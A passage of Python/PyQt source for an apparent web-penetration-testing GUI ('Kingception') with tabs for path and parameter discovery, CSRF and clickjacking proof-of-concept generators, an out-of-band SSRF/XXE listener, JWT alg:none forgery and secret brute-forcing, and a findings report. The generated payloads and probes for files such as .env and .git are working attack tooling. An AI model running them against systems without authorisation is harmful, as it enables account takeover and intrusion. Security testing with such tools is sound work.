        from concurrent.futures import ThreadPoolExecutor
        WORDLIST = [
            "admin", "login", "api", "v1", "v2", "config", "backup", "test", "dev", "upload", "uploads",
            "files", "img", "images", "assets", "static", "js", "css", "data", "db", "sql", "dump", "logs",
            "log", "debug", "secret", "private", "internal", "hidden", "old", "bak", "tmp", "cache",
            "wp-admin", "wp-login", "phpmyadmin", "adminer", "manager", "console", "panel", "dashboard",
            "portal", "account", "user", "register", "signup", "signin", "logout", "forgot", "reset",
            "settings", "profile", "search", "export", "download", "report", "health", "status", "ping",
            "version", "swagger", "openapi", "graphql", "api-docs", "schema", "metrics", "actuator",
            "env", "robots.txt", "sitemap.xml", ".git", ".env", ".htaccess", "web.config", "readme",
            "index.php", "index.html", "default", "home", "main", "app", "src", "lib", "vendor", "dist",
            "auth", "oauth", "token", "session", "csrf", "404", "500",
        ]
        class DiscoveryThread(QThread):
            found = pyqtSignal(dict)
            progress = pyqtSignal(int, str)
            done = pyqtSignal(int)
            def __init__(self, target, exts):
                super().__init__()
                self.target = target.rstrip("/")
                self.exts = exts
                self.running = True
            def run(self):
                paths = []
                for w in WORDLIST:
                    paths.append(f"/{w}")
                    for ext in exts:
                        paths.append(f"/{w}.{ext.lstrip('.')}")
                done = 0
                total = len(paths)
                for path in paths:
                    if not self.running:
                        break
                    url = f"{self.target}{path}"
                    try:
                        r = requests.get(url, verify=False, timeout=6, allow_redirects=False,
                                         headers={"User-Agent": "Kingception/1.0"})
                        if r.status_code not in (404, 410):
                            self.found.emit(dict(url=url, path=path, status=r.status_code,
                                                 size=len(r.content), ct=r.headers.get("Content-Type", "")))
                    except Exception:
                        pass
                    done += 1
                    self.progress.emit(int(done * 100 / total), path)
                self.done.emit(done)
            def stop(self):
                self.running = False
        self._discovery = DiscoveryThread(url, exts)
        self._discovery.found.connect(self._disc_found)
        self._discovery.progress.connect(lambda p, m: self._disc_prog.setValue(p))
        self._discovery.done.connect(lambda n: (
            self._disc_start.setEnabled(True), self._disc_stop.setEnabled(False),
            self._log(f"Discovery done: {n} probed")))
        self._discovery.start()
        self._log(f"Content discovery: {url}")

    def _disc_found(self, r: dict):
        row = self._disc_tbl.rowCount()
        self._disc_tbl.insertRow(row)
        for c, val in enumerate([r["url"], str(r["status"]), pretty_size(r["size"]), r.get("ct", "")]):
            item = QTableWidgetItem(val)
            if c == 1:
                item.setForeground(QBrush(QColor(status_color(r["status"]))))
            self._disc_tbl.setItem(row, c, item)

    def _start_pm(self):
        url = self._pm_url.text().strip()
        if not url:
            return
        method = self._pm_method.currentText()
        self._pm_tbl.setRowCount(0)
        self._pm_prog.setValue(0)
        PARAM_WORDLIST = [
            "id", "user", "username", "email", "password", "token", "key", "api_key", "page", "limit",
            "offset", "sort", "order", "filter", "search", "q", "type", "format", "debug", "callback",
            "redirect", "url", "path", "file", "name", "action", "return", "next", "from", "to", "date",
            "category", "tag", "status", "mode", "view", "admin", "role", "access", "fields", "hash",
            "sign", "nonce", "timestamp", "expires",
        ]
        class ParamMinerThread(QThread):
            found = pyqtSignal(str, str, str)
            progress = pyqtSignal(int, str)
            done = pyqtSignal(int)
            def __init__(self, target, method):
                super().__init__()
                self.target = target
                self.method = method
                self.running = True
            def run(self):
                try:
                    base = requests.request(self.method, self.target, verify=False, timeout=8,
                                            headers={"User-Agent": "IX/5"})
                    bl = len(base.content)
                    bs = base.status_code
                except Exception:
                    return
                done = 0
                total = len(PARAM_WORDLIST)
                for param in PARAM_WORDLIST:
                    if not self.running:
                        break
                    val = "kingception_42"
                    try:
                        if self.method == "GET":
                            sep = "&" if "?" in self.target else "?"
                            r = requests.get(f"{self.target}{sep}{param}={val}", verify=False,
                                             timeout=6, headers={"User-Agent": "IX/5"}, allow_redirects=False)
                        else:
                            r = requests.post(self.target, data={param: val}, verify=False,
                                              timeout=6, headers={"User-Agent": "IX/5"}, allow_redirects=False)
                        diff = abs(len(r.content) - bl)
                        if r.status_code != bs or diff > 150:
                            self.found.emit(param, val, f"Status:{r.status_code} Size:{len(r.content)} Δ{diff:+d}")
                    except Exception:
                        pass
                    done += 1
                    self.progress.emit(int(done * 100 / total), param)
                self.done.emit(done)
            def stop(self):
                self.running = False
        self._param_miner = ParamMinerThread(url, method)
        self._param_miner.found.connect(lambda p, v, e: (
            row := self._pm_tbl.rowCount(),
            self._pm_tbl.insertRow(row),
            [self._pm_tbl.setItem(row, c, QTableWidgetItem(val)) for c, val in enumerate([p, v, e])]
        ))
        self._param_miner.progress.connect(lambda p, m: self._pm_prog.setValue(p))
        self._param_miner.done.connect(lambda n: self._log(f"Param miner done: {n} tested"))
        self._param_miner.start()
        self._log(f"Param miner: {url}")

    # ---------- Sitemap ----------
    def _sitemap_tab(self):
        w = QWidget()
        v = QVBoxLayout(w)
        v.setContentsMargins(4, 4, 4, 4)
        bar = QHBoxLayout()
        ref = self._btn("↻ Refresh", h=28)
        ref.clicked.connect(self._refresh_sitemap)
        exp = self._btn("📋 Copy list", h=28)
        exp.clicked.connect(self._copy_sitemap)
        bar.addWidget(ref)
        bar.addWidget(exp)
        bar.addStretch()
        v.addLayout(bar)
        self._sitemap_tree = QTreeWidget()
        self._sitemap_tree.setHeaderLabels(["Endpoint", "Methods", "Count"])
        self._sitemap_tree.header().setStretchLastSection(True)
        self._sitemap_tree.setAlternatingRowColors(True)
        v.addWidget(self._sitemap_tree)
        return w

    def _refresh_sitemap(self):
        self._sitemap_tree.clear()
        sm = self.db.sitemap()
        for host, paths in sorted(sm.items()):
            hi = QTreeWidgetItem([host, "", str(len(paths))])
            hi.setForeground(0, QBrush(QColor(T.BLUE)))
            for path, methods in sorted(paths.items()):
                ch = QTreeWidgetItem([path, ", ".join(sorted(methods)), ""])
                ch.setForeground(1, QBrush(QColor(T.CYAN)))
                hi.addChild(ch)
            self._sitemap_tree.addTopLevelItem(hi)
        self._sitemap_tree.expandAll()

    def _copy_sitemap(self):
        lines = []
        sm = self.db.sitemap()
        for host, paths in sorted(sm.items()):
            for path, methods in sorted(paths.items()):
                lines.append(f"{', '.join(sorted(methods))} https://{host}{path}")
        QApplication.clipboard().setText("\n".join(lines))
        self._log(f"Sitemap copied ({len(lines)} endpoints)")

    # ---------- Attack Tools ----------
    def _atk_tools_tab(self):
        w = QWidget()
        v = QVBoxLayout(w)
        v.setContentsMargins(8, 8, 8, 8)
        atabs = QTabWidget()
        v.addWidget(atabs)

        # CSRF PoC
        csw = QWidget()
        csv2 = QVBoxLayout(csw)
        csv2.setContentsMargins(8, 8, 8, 8)
        csv2.addWidget(QLabel("Paste a POST request below to auto-generate a CSRF HTML PoC", styleSheet=f"color:{T.TXT2}"))
        self._csrf_req = QPlainTextEdit()
        self._csrf_req.setFont(mono_font(10))
        self._csrf_req.setPlaceholderText("POST /transfer HTTP/1.1\nHost: bank.com\n\namount=1000&to=attacker")
        csv2.addWidget(self._csrf_req)
        csrf_gen = self._btn("⚔ Generate CSRF PoC", "orange", 30)
        csv2.addWidget(csrf_gen)
        self._csrf_out = QPlainTextEdit()
        self._csrf_out.setReadOnly(True)
        self._csrf_out.setFont(mono_font(10))
        csv2.addWidget(self._csrf_out)
        csrf_copy = self._btn("📋 Copy PoC", h=26)
        csrf_copy.clicked.connect(lambda: QApplication.clipboard().setText(self._csrf_out.toPlainText()))
        csv2.addWidget(csrf_copy)
        csrf_gen.clicked.connect(self._gen_csrf)
        atabs.addTab(csw, "⚔ CSRF PoC")

        # Clickjacking PoC
        cjw = QWidget()
        cjv = QVBoxLayout(cjw)
        cjv.setContentsMargins(8, 8, 8, 8)
        cjr = QHBoxLayout()
        cjr.addWidget(QLabel("Target URL:"))
        self._cj_url = QLineEdit()
        self._cj_url.setPlaceholderText("https://target.com/action")
        cjr.addWidget(self._cj_url)
        cj_gen = self._btn("⚔ Generate Clickjacking PoC", "orange", 30)
        cjr.addWidget(cj_gen)
        cjv.addLayout(cjr)
        self._cj_out = QPlainTextEdit()
        self._cj_out.setReadOnly(True)
        self._cj_out.setFont(mono_font(10))
        cjv.addWidget(self._cj_out)
        cj_copy = self._btn("📋 Copy PoC", h=26)
        cj_copy.clicked.connect(lambda: QApplication.clipboard().setText(self._cj_out.toPlainText()))
        cjv.addWidget(cj_copy)
        cj_gen.clicked.connect(self._gen_cj)
        atabs.addTab(cjw, "🖱 Clickjacking")

        # OOB Listener
        oow = QWidget()
        oov = QVBoxLayout(oow)
        oov.setContentsMargins(8, 8, 8, 8)
        ob = QHBoxLayout()
        self._oob_port = QSpinBox()
        self._oob_port.setRange(1024, 65535)
        self._oob_port.setValue(7777)
        self._oob_start_btn = self._btn("▶ Start OOB Listener", "primary", 30)
        self._oob_stop_btn = self._btn("⏹ Stop", "danger", 30)
        self._oob_stop_btn.setEnabled(False)
        ob.addWidget(QLabel("Port:"))
        ob.addWidget(self._oob_port)
        ob.addWidget(self._oob_start_btn)
        ob.addWidget(self._oob_stop_btn)
        ob.addStretch()
        oov.addLayout(ob)
        self._oob_lbl = QLabel("Listener not running")
        self._oob_lbl.setStyleSheet(f"color:{T.TXT2};font-family:{T.MONO};font-size:12px")
        oov.addWidget(self._oob_lbl)
        self._oob_log = QPlainTextEdit()
        self._oob_log.setReadOnly(True)
        self._oob_log.setFont(mono_font(10))
        oov.addWidget(self._oob_log)
        self._oob_start_btn.clicked.connect(self._start_oob)
        self._oob_stop_btn.clicked.connect(self._stop_oob)
        atabs.addTab(oow, "📡 OOB Listener")

        # Auto-Responder
        arw = QWidget()
        arv = QVBoxLayout(arw)
        arv.setContentsMargins(8, 8, 8, 8)
        arv.addWidget(QLabel("Serve custom responses for matching URLs", styleSheet=f"color:{T.TXT2}"))
        self._ar_tbl = QTableWidget(0, 5)
        self._ar_tbl.setHorizontalHeaderLabels(["Match Pattern", "Status", "Body", "Regex", "Enabled"])
        self._ar_tbl.horizontalHeader().setStretchLastSection(True)
        arv.addWidget(self._ar_tbl)
        arb = QHBoxLayout()
        ar_add = self._btn("➕ Add Rule", h=28)
        ar_del = self._btn("🗑 Delete", "danger", 28)
        ar_add.clicked.connect(self._add_ar_rule)
        ar_del.clicked.connect(self._del_ar_rule)
        arb.addWidget(ar_add)
        arb.addWidget(ar_del)
        arb.addStretch()
        arv.addLayout(arb)
        atabs.addTab(arw, "🤖 Auto-Responder")

        # Report
        rpw = QWidget()
        rpv = QVBoxLayout(rpw)
        rpv.setContentsMargins(8, 8, 8, 8)
        rpv.addWidget(QLabel("Export all scanner findings as a professional HTML report", styleSheet=f"color:{T.TXT2}"))
        rph = QHBoxLayout()
        self._report_target = QLineEdit()
        self._report_target.setPlaceholderText("Target name / URL for report header")
        rp_gen = self._btn("📄 Generate HTML Report", "teal", 30)
        rph.addWidget(QLabel("Target:"))
        rph.addWidget(self._report_target)
        rph.addWidget(rp_gen)
        rpv.addLayout(rph)
        self._report_preview = QPlainTextEdit()
        self._report_preview.setReadOnly(True)
        self._report_preview.setFont(mono_font(10))
        self._report_preview.setPlaceholderText("Report preview will appear here…")
        rpv.addWidget(self._report_preview)
        rp_gen.clicked.connect(self._gen_report)
        atabs.addTab(rpw, "📄 Report")
        return w

    def _gen_csrf(self):
        raw = self._csrf_req.toPlainText().strip()
        if not raw:
            return
        lines = raw.split("\n")
        m = re.match(r"(POST|PUT)\s+(\S+)", lines[0]) if lines else None
        action = m.group(2) if m else "/target"
        host_l = [l for l in lines if l.lower().startswith("host:")]
        host = host_l[0].split(":", 1)[1].strip() if host_l else "target.com"
        body_start = next((i for i, l in enumerate(lines) if not l.strip()), len(lines))
        body = "\n".join(lines[body_start + 1:]).strip()
        fields = []
        for pair in body.split("&"):
            if "=" in pair:
                k, v2 = pair.split("=", 1)
                fields.append((url_unquote(k), url_unquote(v2)))
        inputs = "\n".join(f'    <input type="hidden" name="{k}" value="{v2}">' for k, v2 in fields)
        full_url = f"https://{host}{action}"
        poc = f'''<!DOCTYPE html>
<html><body>
<h2>CSRF PoC — Kingception v1.0</h2>
<p>Target: <code>{full_url}</code></p>
<form action="{full_url}" method="POST" id="csrf">
{inputs}
  <input type="submit" value="Submit CSRF">
</form>
<script>document.getElementById("csrf").submit();</script>
</body></html>'''
        self._csrf_out.setPlainText(poc)
        self._log(f"CSRF PoC generated for {full_url}")

    def _gen_cj(self):
        url = self._cj_url.text().strip() or "https://target.com"
        poc = f'''<!DOCTYPE html>
<html><head><style>
body{{margin:0;background:#1a1a2e;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;color:white}}
.wrap{{position:relative;width:800px;height:600px;border:2px dashed #ef4444;border-radius:8px}}
iframe{{position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.3;z-index:2;border:none;border-radius:8px}}
.click-me{{position:absolute;top:40%;left:50%;transform:translate(-50%,-50%);z-index:1;font-size:20px;font-weight:700;background:#ef4444;color:white;padding:14px 28px;border-radius:7px;cursor:pointer;pointer-events:none}}
</style></head><body>
<h2 style="color:#ef4444;margin-bottom:12px">⚡ Clickjacking PoC — Kingception v1.0</h2>
<p style="margin-bottom:16px;color:#94a3b8">Target: {url} | iframe opacity=0.3 for demo (set to 0.001 for real attack)</p>
<div class="wrap">
  <div class="click-me">🖱 Win a Prize! Click Here!</div>
  <iframe src="{url}"></iframe>
</div>
<p style="margin-top:12px;color:#94a3b8;font-size:12px">If the target loads, it is vulnerable to clickjacking. Set iframe opacity to ~0.001 to hide it from victim.</p>
</body></html>'''
        self._cj_out.setPlainText(poc)
        self._log(f"Clickjacking PoC generated for {url}")

    def _start_oob(self):
        class OOBListener(QObject):
            hit = pyqtSignal(dict)
            def __init__(self, port):
                super().__init__()
                self.port = port
                self.running = False
                self._srv = None
            def start(self):
                self.running = True
                threading.Thread(target=self._serve, daemon=True).start()
            def stop(self):
                self.running = False
                if self._srv:
                    try: self._srv.close()
                    except: pass
            def _serve(self):
                try:
                    self._srv = socket.socket()
                    self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    self._srv.bind(("0.0.0.0", self.port))
                    self._srv.listen(50)
                    self._srv.settimeout(1)
                    while self.running:
                        try:
                            cs, ca = self._srv.accept()
                            threading.Thread(target=self._handle, args=(cs, ca), daemon=True).start()
                        except socket.timeout:
                            continue
                except Exception:
                    pass
            def _handle(self, cs, ca):
                try:
                    data = cs.recv(4096).decode("utf-8", "replace")
                    cs.sendall(b"HTTP/1.1 200 OK\r\nContent-Length:2\r\n\r\nOK")
                    req_line = data.split("\r\n")[0] if data else ""
                    ts = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
                    self.hit.emit(dict(ts=ts, src=f"{ca[0]}:{ca[1]}", req=req_line, raw=data[:500]))
                except Exception:
                    pass
                finally:
                    try: cs.close()
                    except: pass
        self._oob = OOBListener(self._oob_port.value())
        self._oob.hit.connect(lambda h: self._oob_log.appendPlainText(f"[{h['ts']}] {h['src']}\n{h['req']}\n{'─'*50}"))
        self._oob.start()
        self._oob_lbl.setText(f"✅  http://127.0.0.1:{self._oob_port.value()}  (use your public IP for real SSRF/XXE tests)")
        self._oob_lbl.setStyleSheet(f"color:{T.GREEN};font-family:{T.MONO};font-size:12px")
        self._oob_start_btn.setEnabled(False)
        self._oob_stop_btn.setEnabled(True)
        self._log(f"OOB listener started on port {self._oob_port.value()}")

    def _stop_oob(self):
        if self._oob:
            self._oob.stop()
        self._oob_start_btn.setEnabled(True)
        self._oob_stop_btn.setEnabled(False)
        self._oob_lbl.setText("Listener stopped")
        self._log("OOB stopped")

    def _add_ar_rule(self):
        @dataclass
        class AutoResp:
            id: str; match: str; status: int; body: str; headers: str; enabled: bool; is_regex: bool
        d = QDialog(self)
        d.setWindowTitle("Auto-Responder Rule")
        d.resize(500, 300)
        fl = QFormLayout(d)
        fl.setContentsMargins(16, 16, 16, 16)
        match = QLineEdit()
        fl.addRow("Match URL/Pattern:", match)
        status = QSpinBox()
        status.setRange(100, 599)
        status.setValue(200)
        fl.addRow("Status:", status)
        body = QPlainTextEdit()
        body.setPlaceholderText('{"message":"intercepted"}')
        body.setMaximumHeight(80)
        fl.addRow("Body:", body)
        headers_e = QPlainTextEdit()
        headers_e.setMaximumHeight(60)
        headers_e.setPlaceholderText("Content-Type: application/json")
        fl.addRow("Headers:", headers_e)
        is_rx = QCheckBox("Use Regex")
        fl.addRow("", is_rx)
        btns = QDialogButtonBox(QDialogButtonBox.StandardButton.Ok | QDialogButtonBox.StandardButton.Cancel)
        btns.accepted.connect(d.accept)
        btns.rejected.connect(d.reject)
        fl.addRow(btns)
        if d.exec() == QDialog.DialogCode.Accepted:
            rule = AutoResp(str(uuid.uuid4()), match.text(), status.value(),
                            body.toPlainText(), headers_e.toPlainText(), True, is_rx.isChecked())
            self.proxy.responders.append(rule)
            self.db.save_responder(rule)
            r = self._ar_tbl.rowCount()
            self._ar_tbl.insertRow(r)
            for c, val in enumerate([match.text(), str(status.value()), body.toPlainText()[:40],
                                     "✓" if is_rx.isChecked() else "", "✓"]):
                self._ar_tbl.setItem(r, c, QTableWidgetItem(val))
            self._log(f"Auto-responder: {match.text()}")

    def _del_ar_rule(self):
        row = self._ar_tbl.currentRow()
        if row < 0:
            return
        if row < len(self.proxy.responders):
            self.proxy.responders.pop(row)
        self._ar_tbl.removeRow(row)

    def _gen_report(self):
        scans = self.db.list_scans()
        if not scans:
            QMessageBox.information(self, "Report", "No scan findings yet. Run Scanner first.")
            return
        target = self._report_target.text().strip() or "Target"
        SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        SEV_COLOR = {"critical": "#ec4899", "high": "#ef4444", "medium": "#f59e0b", "low": "#06b6d4", "info": "#475569"}
        scans = sorted(scans, key=lambda r: SEV_ORDER.get(r.get("severity", "info"), 5))
        counts = Counter(r.get("severity", "info") for r in scans)
        def badge(sev):
            c = SEV_COLOR.get(sev, "#475569")
            return f'<span style="background:{c}22;color:{c};padding:3px 10px;border-radius:12px;font-size:12px;font-weight:600;margin-right:6px">{sev.upper()} {counts.get(sev,0)}</span>'
        rows = "".join(f"""
        <tr>
            <td style="color:{SEV_COLOR.get(r.get("severity",""),"#475569")};font-weight:700;text-transform:uppercase">{r.get("severity","")}</td>
            <td><strong>{r.get("vuln_type","")}</strong></td>
            <td>{r.get("desc","")[:120]}</td>
            <td>{r.get("cwe","")}</td>
            <td style="color:{SEV_COLOR.get(r.get("severity",""),"")}">{r.get("cvss",0)}</td>
            <td style="font-size:11px">{r.get("fix","")[:80]}</td>
        </tr>""" for r in scans)
        details = "".join(f"""<div style="margin-bottom:20px;border:1px solid #1c2e50;border-radius:7px;overflow:hidden">
            <div style="background:#111d35;padding:12px 16px;border-bottom:1px solid #1c2e50;display:flex;align-items:center;gap:10px">
                <span style="background:{SEV_COLOR.get(r.get("severity",""),"#475569")}22;color:{SEV_COLOR.get(r.get("severity",""),"#475569")};padding:2px 10px;border-radius:4px;font-size:11px;font-weight:700;text-transform:uppercase">{r.get("severity","")}</span>
                <strong style="font-size:14px">{r.get("vuln_type","")}</strong>
                <span style="margin-left:auto;color:#94a3b8;font-size:11px">CVSS {r.get("cvss",0)} · {r.get("cwe","")}</span>
            </div>
            <div style="padding:14px 16px;background:#09111e">
                <p><strong>Description:</strong> {r.get("desc","")}</p>
                <p style="margin-top:6px"><strong>Fix:</strong> {r.get("fix","")}</p>
                {"<details style=\"margin-top:8px\"><summary style=\"cursor:pointer;color:#4d8ef7\">Evidence</summary><pre style=\"background:#0b1523;padding:10px;border-radius:4px;font-size:11px;overflow:auto;color:#a9d1ff\">" + str(r.get("resp_ev",""))[:400] + "</pre></details>" if r.get("resp_ev") else ""}
            </div>
        </div>""" for r in scans)
        html = f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Kingception Report — {target}</title>
<style>*{{box-sizing:border-box;margin:0;padding:0}}body{{background:#07101d;color:#e2e8f0;font-family:Inter,Segoe UI,Arial,sans-serif;font-size:14px;line-height:1.6}}.c{{max-width:1100px;margin:0 auto;padding:32px 24px}}h1{{font-size:24px;font-weight:700;color:#4d8ef7;margin-bottom:4px}}h2{{font-size:17px;font-weight:600;color:#e2e8f0;margin:28px 0 12px}}.meta{{color:#94a3b8;font-size:13px;margin-bottom:22px}}table{{width:100%;border-collapse:collapse;background:#0f1d30;border:1px solid #1a2d4a;border-radius:7px;overflow:hidden}}th{{background:#0b1523;color:#94a3b8;padding:8px 12px;text-align:left;font-size:10px;text-transform:uppercase;letter-spacing:.6px;border-bottom:1px solid #1a2d4a}}td{{padding:8px 12px;border-bottom:1px solid #152236;font-size:13px}}tr:hover td{{background:#152236}}</style></head>
<body><div class="c"><div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px"><div><h1>⚡ Security Report</h1><div class="meta">Target: <strong>{target}</strong> &nbsp;·&nbsp; {datetime.datetime.now().strftime("%Y-%m-%d %H:%M")} &nbsp;·&nbsp; Kingception v1.0</div></div><div>{badge("critical")}{badge("high")}{badge("medium")}{badge("low")}</div></div>
<h2>Summary</h2>
<table><thead><tr><th>Severity</th><th>Type</th><th>Description</th><th>CWE</th><th>CVSS</th><th>Fix</th></tr></thead><tbody>{rows}</tbody></table>
<h2>Details</h2>{details if details else "<p style=\"color:#475569\">No findings.</p>"}
<div style="margin-top:36px;border-top:1px solid #1a2d4a;padding-top:14px;color:#475569;font-size:11px;text-align:center">Kingception v1.0 · For authorised testing only · {datetime.datetime.now().year}</div>
</div></body></html>"""
        self._report_preview.setPlainText(html[:3000] + "\n\n... (HTML truncated for preview)")
        path, _ = QFileDialog.getSaveFileName(self, "Save Report", "report.html", "HTML (*.html)")
        if not path:
            return
        with open(path, "w", encoding="utf-8") as f:
            f.write(html)
        self._log(f"Report saved: {path}")
        webbrowser.open(f"file://{os.path.abspath(path)}")

    # ---------- Dashboard ----------
    def _dashboard_tab(self):
        w = QWidget()
        v = QVBoxLayout(w)
        v.setContentsMargins(12, 12, 12, 12)
        self._dash_cards = {}
        row = QHBoxLayout()
        for name, color in [("Total Requests", T.BLUE), ("Hosts", T.CYAN),
                            ("Findings", T.RED), ("Req/s", T.GREEN)]:
            c = QWidget()
            cv = QVBoxLayout(c)
            cv.setContentsMargins(14, 14, 14, 14)
            c.setStyleSheet(f"background:{T.CARD};border:1px solid {T.BORDER};border-radius:12px")
            num = QLabel("0")
            num.setStyleSheet(f"font-size:28px;font-weight:700;color:{color}")
            lbl = QLabel(name)
            lbl.setStyleSheet(f"color:{T.TXT2};font-size:10px;text-transform:uppercase;letter-spacing:.6px")
            cv.addWidget(num)
            cv.addWidget(lbl)
            self._dash_cards[name] = (c, num)
            row.addWidget(c)
        v.addLayout(row)
        mid = QSplitter(Qt.Orientation.Horizontal)
        v.addWidget(mid, 1)
        sw = QWidget()
        sv = QVBoxLayout(sw)
        sv.addWidget(QLabel("Request Rate (r/s)"))
        self._sparkline = SparklineWidget()
        sv.addWidget(self._sparkline, 1)
        mid.addWidget(sw)
        tw = QWidget()
        tv = QVBoxLayout(tw)
        tv.addWidget(QLabel("Top Hosts"))
        self._dash_hosts = QTableWidget(0, 2)
        self._dash_hosts.setHorizontalHeaderLabels(["Host", "Requests"])
        self._dash_hosts.horizontalHeader().setStretchLastSection(True)
        tv.addWidget(self._dash_hosts, 1)
        mid.addWidget(tw)
        dw = QWidget()
        dv = QVBoxLayout(dw)
        dv.addWidget(QLabel("Status / Method Distribution"))
        self._dash_status = QPlainTextEdit()
        self._dash_status.setReadOnly(True)
        self._dash_status.setFont(mono_font(10))
        dv.addWidget(self._dash_status, 1)
        mid.addWidget(dw)
        mid.setSizes([550, 450, 400])
        return w

    # ---------- Comparer ----------
    def _comparer_tab(self):
        w = QWidget()
        v = QVBoxLayout(w)
        v.setContentsMargins(8, 8, 8, 8)
        lbl = QLabel("Paste two HTTP messages to diff them side-by-side")
        lbl.setStyleSheet(f"color:{T.TXT2};font-size:12px;margin-bottom:4px")
        v.addWidget(lbl)

        inp_sp = QSplitter(Qt.Orientation.Horizontal)
        v.addWidget(inp_sp)
        for side, attr in [("Message A", "comp_a"), ("Message B", "comp_b")]:
            c = QWidget()
            cv = QVBoxLayout(c)
            cv.setContentsMargins(0, 0, 0, 0)
            cv.addWidget(QLabel(side))
            pe = QPlainTextEdit()
            pe.setFont(mono_font(10))
            pe.setPlaceholderText(f"Paste HTTP message {side[-1]}…")
            setattr(self, attr, pe)
            cv.addWidget(pe)
            inp_sp.addWidget(c)
        inp_sp.setSizes([800, 800])

        diff_btn = self._btn("⚖ Compare", "primary", h=32)
        diff_btn.clicked.connect(self._run_compare)
        v.addWidget(diff_btn)

        diff_sp = QSplitter(Qt.Orientation.Horizontal)
        v.addWidget(diff_sp)
        for attr in ["diff_a_view", "diff_b_view"]:
            pe = QPlainTextEdit()
            pe.setReadOnly(True)
            pe.setFont(mono_font(10))
            pe.setLineWrapMode(QPlainTextEdit.LineWrapMode.NoWrap)
            setattr(self, attr, pe)
            diff_sp.addWidget(pe)

        legend = QLabel("  🟢 Added (+)   🔴 Removed (-)   ⬛ Same (=)")
        legend.setStyleSheet(f"color:{T.TXT2};font-size:11px;padding:4px")
        v.addWidget(legend)
        return w

    def _run_compare(self):
        """Comparer tab removed — stub to avoid AttributeError."""
        pass

    def _jwt_tab(self):
        w = QWidget()
        v = QVBoxLayout(w)
        v.setContentsMargins(8, 8, 8, 8)
        v.addWidget(QLabel("JWT Analyzer — Decode · Edit · Re-sign · Attack"))

        self.jwt_input = QPlainTextEdit()
        self.jwt_input.setMaximumHeight(80)
        self.jwt_input.setFont(mono_font(10))
        self.jwt_input.setPlaceholderText("Paste JWT token here…")
        v.addWidget(self.jwt_input)

        action_bar = QHBoxLayout()
        decode_btn = self._btn("🔍 Decode", "primary", h=30)
        none_atk_btn = self._btn("⚠ alg:none Attack", "warning", h=30)
        brute_btn = self._btn("🔓 Brute Secret", "purple", h=30)
        resign_btn = self._btn("✏ Re-sign", "success", h=30)
        for b in [decode_btn, none_atk_btn, brute_btn, resign_btn]:
            action_bar.addWidget(b)
        action_bar.addStretch()
        v.addLayout(action_bar)

        sp = QSplitter(Qt.Orientation.Horizontal)
        v.addWidget(sp)

        lw = QWidget()
        lv = QVBoxLayout(lw)
        lv.setContentsMargins(0, 0, 0, 0)
        lv.addWidget(QLabel("Header (JSON):"))
        self.jwt_header = QPlainTextEdit()
        self.jwt_header.setFont(mono_font(10))
        lv.addWidget(self.jwt_header)
        lv.addWidget(QLabel("Payload (JSON):"))
        self.jwt_payload = QPlainTextEdit()
        self.jwt_payload.setFont(mono_font(10))
        lv.addWidget(self.jwt_payload)
        lv.addWidget(QLabel("Signing Secret (for re-sign):"))
        self.jwt_secret = QLineEdit()
        self.jwt_secret.setPlaceholderText("secret / empty for HS256")
        lv.addWidget(self.jwt_secret)
        sp.addWidget(lw)

        rw = QWidget()
        rv = QVBoxLayout(rw)
        rv.setContentsMargins(0, 0, 0, 0)
        rv.addWidget(QLabel("Output / Result:"))
        self.jwt_output = QPlainTextEdit()
        self.jwt_output.setFont(mono_font(10))
        rv.addWidget(self.jwt_output)
        rv.addWidget(QLabel("Brute-force wordlist (one per line):"))
        self.jwt_wordlist = QPlainTextEdit()
        self.jwt_wordlist.setMaximumHeight(80)
        self.jwt_wordlist.setFont(mono_font(10))
        self.jwt_wordlist.setPlainText('\n'.join(Payloads.COMMON_PASSWORDS))
        rv.addWidget(self.jwt_wordlist)
        sp.addWidget(rw)
        sp.setSizes([600, 600])

        def do_decode():
            token = self.jwt_input.toPlainText().strip()
            if not token:
                return
            try:
                result = JWTAnalyzer.decode(token)
                self.jwt_header.setPlainText(json.dumps(result.get('header', {}), indent=2))
                self.jwt_payload.setPlainText(json.dumps(result.get('payload', {}), indent=2))
                self.jwt_output.setPlainText(json.dumps(result, indent=2))
            except Exception as e:
                self.jwt_output.setPlainText(f"Error: {e}")

        def do_none_attack():
            token = self.jwt_input.toPlainText().strip()
            if not token:
                return
            try:
                forged = JWTAnalyzer.encode_none_attack(token)
                self.jwt_output.setPlainText(
                    "alg:none forged token:\n\n" + forged +
                    "\n\nTry sending this to the server. If accepted, the application doesn't verify signatures.")
            except Exception as e:
                self.jwt_output.setPlainText(f"Error: {e}")

        def do_brute():
            token = self.jwt_input.toPlainText().strip()
            if not token:
                return
            wl = [l for l in self.jwt_wordlist.toPlainText().split('\n') if l.strip()]
            self.jwt_output.setPlainText(f"Brute-forcing {len(wl)} secrets…")
            def run():
                found = JWTAnalyzer.brute_sign(token, wl)
                if found:
                    self.jwt_output.setPlainText(f"✅ SECRET FOUND: {found}")
                else:
                    self.jwt_output.setPlainText("❌ Secret not in wordlist")
            threading.Thread(target=run, daemon=True).start()

        def do_resign():
            try:
                tok = JWTAnalyzer.re_sign(
                    self.jwt_header.toPlainText(),
                    self.jwt_payload.toPlainText(),
                    self.jwt_secret.text())
                self.jwt_output.setPlainText("Re-signed token:\n\n" + tok)
            except Exception as e:
                self.jwt_output.setPlainText(f"Error: {e}")

        decode_btn.clicked.connect(do_decode)
        none_atk_btn.clicked.connect(do_none_attack)
        brute_btn.clicked.connect(do_brute)
        resign_btn.clicked.connect(do_resign)
        return w

    # ---------- Decoder ----------
    def _decoder_tab(self):
        w = QWidget()
        v = QVBoxLayout(w)
        v.setContentsMargins(8, 8, 8, 8)
        v.addWidget(QLabel("Encoder / Decoder — multi-step chains supported"))
        self.dec_in = QPlainTextEdit()
        self.dec_in.setFont(mono_font(11))
        self.dec_in.setPlaceholderText("Enter text to encode or decode…")
        v.addWidget(self.dec_in)
        bar = QHBoxLayout()
        self.dec_type = QComboBox()
        self.dec_type.addItems(["Base64", "Base64 URL-safe", "URL Encode", "Hex",
                                "HTML Entity", "JWT Decode", "MD5 Hash", "SHA-256 Hash", "ROT13"])
        bar.addWidget(self.dec_type)
